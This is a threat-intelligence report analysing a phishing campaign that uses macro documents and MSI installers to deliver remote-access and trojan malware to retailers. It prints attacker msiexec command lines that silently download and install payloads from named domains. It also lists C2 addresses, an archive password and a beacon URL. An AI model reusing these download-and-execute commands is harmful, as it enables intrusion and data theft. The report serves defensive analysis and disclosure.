Attack Summary
In mid-December we detected an email spear-phishing campaign targeting large USA retailers and other
organizations in the food and beverage industry. This campaign delivers several malware families such as Gussdoor,
Xrat, and Vimditator among others.
The phishing document appears to come from a Ricoh printer and contains the targeted organization logo. The
phishing document is a macro enabled document, which executes and downloads 2nd stage to the victim’s machine.

Campaign Details
During the campaign we observed the threat actor sends several phishing documents, one document (MD5:
e377557c8f35beeb050370c4479bcb04) see figure 1. Once executed, the macro executes the following
command connecting to hxxp:// local365office.com/content /q using the /q directive which
tells msiexec to run in the background.
C:\Windows\System32\msiexec.exe" step=six done=false /i
http://local365office.com/content /q change=false
msiexec.exe downloads and loads an MSI binary (MD5:69f09ef629df82c8498328272b569160) figure 2
shows the execution flow of the MSI binary.

The MSI installer drops another binary file to disk to the following directory
c:\windows\installer\msi2adc.tmp (MD5: d7a3237eaeeda49aadb08e2d2b77544d) which
then extracts the following files to the appdata\local\temp\ directory :

Once extracted exit.exe launches and spawns cmd.exe with the following command line parameters cmd.exe"
/C i.cmd”. the content of i.cmd is shown in figure 3

Figure 3 - Embedded VBScript
The i.cmd executes a ping command with -n 3 indicating the number of echo requests to cloudflare.com
with -w 3000 indicating a timeout time of 3000 milliseconds. The malware does that to check internet
connectivity. If the ping requests succeed indicated by the IF %ERRORLEVEL% NEQ 1 which checks that the
command was executed successfully with no error, it then changes the name of syst.dll file dropped previously
and changes its name to 7zinstall.exe, it then runs another ping command to cloudfalre.com and if
successful, 7zinstall.exe is executed and self-extracts itself as indicated with x parameter using the -p and
the password of 3KPnoNJ3ReME4bEU5W9APkKS5ErkR3tNRT. 7zinstall.exe then extracts the following files
to the following directory C:\ProgramData\Microtik:

Once the files are extracted, 7zinstall.exe executes exit.exe using ShellExecuteEX as shown in figure 4

Figure 4 – 7zinstall.exe lunches exit.exe
exit.exe then spawns cmd.exe with the following command line parameters cmd.exe /C i.cmd, the content
of i.cmd is shown in figure 5.

Figure 5 – i.cmd content

When executed i.cmd sets a registry name called “Microtik” under
HKCU\Software\Microsoft\Windows\CurrentVersion\Run with the value of
c:\ProgramData\Microtik\winserv.exe which is the RMS remote access program and then launches
winserve.exe. it then tries to forcefully kill rundell32.exe, which causes the script to go into a loop.
Once winserv.exe is executed it tries to connect to 89.144.25.32:5655 C2 server located in Germany which
was down at the time of the analysis.
When pivoting on the domain local365office.com it is hosted on the IP Address 88.99.180.3 located in
Germany. Checking the ISP IP information, it shows it belongs to ISP called Oleg Gorshkov. This ISP shares that
information only with 139 other domains.
One of those domains is office365onlinehome.com which has a very similar naming convention to
local365office.com. when examining office365onlinehome.com it shows a malicious document
(MD5: a7194d55e60cbfa69a5b31d039182882) was communicating with that domain with a common lure
theme as shown in figure 6

Figure 6 - phishing document

Looking at the document it is clear to be related with the other phishing documents described above.
Further analysis of the malicious document shows similar TTP’s executing msiexec.exe with the following
command line artifacts msiexec.exe next=back error=shutdown /i
http://office365onlinehome.com/host32 /q OnChange="c:\windows\system32"
Aciqy=VIk¶µ±s1. It then connects to office365onlinehome.com over port 80 and downloads an msi
installer (MD5: f3014c7ac2848ca542e6ba16e20452f4) to the AppData\Local\Temp\ directory,
once executed the msi installer drops the following filemsi2a01.tmp (MD5:
c4a201a6f5e07136923f824bda4cd54f) to the following directory C:\Windows\Installer\ and
executes the file. This file was used in another reported campaign published by Proofpoint describing a threat
actor they refer as TA505 delivering a new back door they call ServHelper1
When executed it creates the following files in the AppData\Local\Temp\ directory

The vbs script acts as a launcher and executes zxa.bat, the content of zxa.bat is shown in figure 8

Figure 8 - zxa.bat content

zxa.bat act as launcher and executes helpobj.dat using rundll32.exe, helpobj.dat is a PECompact
packed DLL file commonly known as Win32.Trojan.Delf. this malware family is a generic trojan which is
usually used to steal victims’ information. The file is signed with a legitimate code signing certificate, the digital
certificate is shown in figure 9

Figure 9 - Code signing certificate details

The certificate name NEON CRAYON LIMITED, searching for NEON CRAYON LIMITED reveals a privately held
company located at 189a Evering Road Flat 1, 189a Evering Road, London, England that deals in computer repair
services, the location of NEON CRAYON LIMITED is shown in figure 10.

Figure 10 - Neon Crayon Limited registered office location

The fact that NEON CRAYON LIMITED is operated from a private residence may indicate that the company was
compromised at some point and got its code signing certificate stolen and used to sign helpobj.dat malware.
When executed helpobj.dat beacons to hxxps://afgdhjkrm.pw/aggdst/Hasrt.php over port 443
using HTTP POST with User-Agent Embarcadero URI Client/1.0 which is identified with RAD
studio a C++/Delphi Compiler, and sends out the following information shown in figure 11.

The information sent to the server includes the host information such as Operating System version and a key
identifier.

Conclusion
This campaign shows yet again how attackers are improving their obfuscation capabilities to hide
their attacks with multi layered executions in hope to evade detection.
This campaign also shows that leveraging commodity malware that packs a strong punch and
delivers sophisticated capabilities, is an intimidating weapon in the hands of a motivated
adversary.
